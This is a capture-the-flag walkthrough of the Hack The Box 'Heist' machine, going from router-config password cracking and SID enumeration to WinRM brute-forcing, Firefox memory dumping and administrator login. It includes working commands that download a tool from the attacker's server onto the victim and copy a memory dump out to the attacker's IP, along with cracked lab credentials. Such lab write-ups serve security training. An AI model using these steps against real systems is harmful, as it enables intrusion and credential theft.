# Overview:

A pretty challenging box that required me to think laterally and use a few tools I wouldn't normally think to pull out. It was a really fun solve, and I learned a lot along the way. Definitely recommend if you're trying to get more experience on Windows machines and exploiting user behaviour.

# Enumeration
Start with an nmap scan to identify listening ports and services:

```
nmap -sS -sV -sC -vv -Pn -oA /home/montana/Documents/hackthebox/heist/allscan 10.10.10.149
```

Providing us with this:
```

## Web Page

My first stop is the web page, and here we a login form - helpfully with the option to "Login as guest":
![LoginForm](https://opalsec.github.io/assets/images/heist/LoginForm.png)

Which shows us a conversation chain between a client and support admin:
![Chat](https://opalsec.github.io/assets/images/heist/Chat.png)

Clicking through to the attachment, it shows a router config:
![config](https://opalsec.github.io/assets/images/heist/config.png)

The first two type 7 passwords easily decrypt to:
- $uperP@ssword (rout3r)
- Q4)sJu\Y8qz*A3?d (admin)

After a little research, I found out that the secret 5 password can be cracked by John, so I fired it up:
```
root@kali:/home/montana/Documents/hackthebox/heist# john -wordlist:/usr/share/wordlists/rockyou.txt secret.txt
```

And checked the pot file upon completion to get the password:
```
root@kali:/home/montana/Documents/hackthebox/heist# cat ~/.john/john.pot
$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
```

Unfortunately the login page only accepts email addresses, and we only have passwords and usernames from the work we just did.

## Digging Deeper

Trying both anonymous logon and combinations of the creds we just dumped didn't work on 445. Going back to the web chat that we saw earlier though, we can see the user Hazard asked the support admin to create an account for him on the Windows server! 

Trying the cracked secret-type creds, we're able to see the account exists:
![hazard](https://opalsec.github.io/assets/images/heist/hazard.png)

Unfortunately there's nothing we can do with that access, so where to from here?

### New box hu dis?

Impacket has an amazing set of python scripts that are part of every pentester's kit. 

The one we'll use is the SID enumeration script - this allows you to enumerate other users on a machine, provided you've got a valid account to authenticate with:
![impacket](https://opalsec.github.io/assets/images/heist/impacket.png)

Now that we've discovered a whole swathe of new users, we can try to bruteforce authentication by creating a list of users and creds that we've found.

# Exploitation 

Metasploit has a useful module under auxiliary/scanner/winrm/winrm_login. This does exactly what we want in that you can point it to a machine's WinRM service, give it a list of creds, and set it loose.

It quickly shows that we've got a valid set of creds to use to initiate a WinRM session with:
![winrm](https://opalsec.github.io/assets/images/heist/winrm.png)

## User
In order to use this, there's a great tool called evil-winrm, which you can download [here](https://github.com/Hackplayers/evil-winrm "Evil WinRM")

It's simple to use, and gets us an interactive session:
![session](https://opalsec.github.io/assets/images/heist/session.png)

## Root
As part of my enum process, I like to look at the running processes to see if there's anything anomalous that might be of interest:
```
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
![procs](https://opalsec.github.io/assets/images/heist/procs.png)

Firefox stands out in this instance, as you wouldn't expect to see a browser running on a server.

The easiest way to snoop on what's going on in those processes is to dump them, so I download [Windows' procdump utility](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump "Procdump") to my Kali machine; host it with Python's Simple HTTP Server, and retrieve it on the victim:

```
Simple HTTP Server (starts on Port 8000 by default):
$> python -m SimpleHTTPServer

Retrieving the file with PowerShell:
PS> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.24:8000/procdump64.exe', 'C:\Users\chase\Documents\procdump64.exe')"
```

I then use it to dump the Firefox processes like so:
```
*Evil-WinRM* PS C:\Users\Chase\Documents> ./procdump64.exe -ma -accepteula 6216 firefox_6216.dmp

```

And in order to retrieve them, I use [pscp](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html "Putty SCP"). I ran into a few issues with pscp not prompting me for input to trust the remote host and input the password, but I got around it by using the below syntax:
```
*Evil-WinRM* PS C:\Users\Chase\Documents> echo y | ./pscp.exe -pw <password> C:\Users\Chase\Documents\firefox_6216.dmp montana@10.10.14.24:/home/montana/Documents/hackthebox/heist

### Echoing "y" accepted the remote host as trusted, and the -pw parameter bypassed the need to interactively enter the password when connecting
```

Now with the files back on Kali, I used grep to search for the "password" string:
![grep](https://opalsec.github.io/assets/images/heist/grep.png)

And inspect the file the string was found in:
![less](https://opalsec.github.io/assets/images/heist/less.png)

Searching within the file, I can see the Admin user's creds in cleartext, being used to authenticate to the web forum:
![rootpw](https://opalsec.github.io/assets/images/heist/rootpw.png)

Finally, I drop out of the existing User WinRM session, and authenticate with the Admin creds:
```
root@Cortana:/opt/evil-winrm# ruby evil-winrm.rb -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'
```

And we find the final flag on the Admin's Desktop:
![flag](https://opalsec.github.io/assets/images/heist/flag.png)

### By the way...
PowerShell does have the ability to search for a string in a file, but I didn't want to do that for several reasons

1. Searching for the string "password" in a memory dump for a browser process would likely provide dozens of results, as it'd parse the HTML of pages that were loaded and give a bunch of false positives;
2. It's best not to do computationally expensive things on the victim machine - both because it could use enough resources to cause lag and prompt the user to check what's going on, but also because it could crash the box if it's already running at high load;
3. If this were an actual engagement, the dump would be an important piece of evidence for use in results, so you'd want a copy on your workstation anyway for posterity.

I get that this was a virtual lab, but since I'm using it as practice for real-world scenarios, I think it's best to practice OpSec whenever possible.
